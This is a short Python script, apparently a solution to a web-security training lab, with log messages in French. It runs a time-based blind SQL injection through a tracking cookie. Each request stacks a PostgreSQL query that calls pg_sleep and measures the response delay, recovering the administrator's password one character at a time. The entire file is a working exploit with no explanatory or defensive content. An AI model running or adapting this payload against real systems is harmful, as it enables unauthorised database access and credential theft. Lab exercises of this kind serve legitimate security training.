import string
import requests
import logging
import sys

def send_request(url, cookie):
    headers = {'Cookie': cookie}
    response = requests.get(url, headers=headers)
    return response

def run_script(url, cookie):
    tracking_cookie = cookie
    password = ''
    logging.info('[*] Recherche du mot de passe de l\'administrateur : ')

    for depth in range(30):
        for char in string.ascii_letters + string.digits:
            condition_cookie = f"{tracking_cookie}'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,{depth + 1},1)='{char}') THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users--"
            response = send_request(url, condition_cookie)
            #print(response.elapsed.total_seconds())
            #print(char)
            if response.elapsed.total_seconds() >= 1:
                password += char
                sys.stdout.write(char)
                sys.stdout.flush()
                break

    if password:
        logging.info(f'\n[*] Mot de passe trouvé : {password}')
    else:
        logging.info('Password not found')

def main():
    logging.basicConfig(format='[%(levelname)s] %(message)s', level=logging.INFO)
    target_url = 'https://0a0b000e03f9b65080515de4003d0068.web-security-academy.net/login'
    tracking_cookie = 'TrackingId=a'

    run_script(target_url, tracking_cookie)

if __name__ == "__main__":
    main()
